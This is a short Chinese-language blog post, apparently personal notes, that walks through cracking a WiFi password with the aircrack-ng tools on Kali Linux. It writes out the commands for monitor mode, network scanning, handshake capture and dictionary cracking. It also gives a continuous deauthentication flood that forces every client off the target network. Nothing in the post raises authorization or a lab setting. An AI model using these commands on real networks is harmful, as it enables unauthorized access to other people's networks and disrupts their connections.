---
title: aircrack破解wifi
date: 2019-03-31 16:11:01
tags:
---

aircrack-ng是处理无线的一个工具包，我们使用的是：

- airmon-ng
- airodump-ng
- aireplay-ng
- aircrack-ng

现在要做的是破解一个wifi密码，大体过程为：

1. 配置网卡
2. 探测wifi信息
3. 抓包
4. 破解

# 配置 #
---

用的环境是虚拟机kali，外面接了个ALFA网卡

1. 查看网卡

	执行`ifconfig`,找到了网卡 wlan0

2. 开启网卡

	`ifconfig wlan0 up`

3. 将网卡变成监听模式

	`airmon-ng start wlan0`
	
	然后发现网卡变成了wlan0mon，即监听模式的网卡，此时网卡配置完成

# 探测wifi信息 #
---
`airodump-ng wlan0mon`

抓包查看信息，在ESSID中找到要破解的wifi名字，记下对应的MAC地址(BSSID)和频道(channel,CH)

# 抓包 #
---
为了破解wifi，需要抓取对应wifi的握手包

`airodump-ng --bssid 地址 -c 频道 -w 存储文件名 wlan0mon`

这时候要等有设备连接wifi才会抓到，我们是不会等的，可以用拒绝服务攻击来强制让设备断开连接，不停的重连

新开一个shell

`aireplay-ng -0 0 -a 地址 wlan0mon`

- -0表示用接触认证攻击，后面的参数0表示不断发送攻击数据包
- -a表示AP的MAC
- -c参数可选，表示要被攻击的客户机MAC，不写的表示所有设备

此时看到抓包界面的右上角出现handshake：地址，即抓包完成了

# 破解 #
---

对抓到的包用字典进行破解

`aircrack-ng -w 字典 数据包.cap`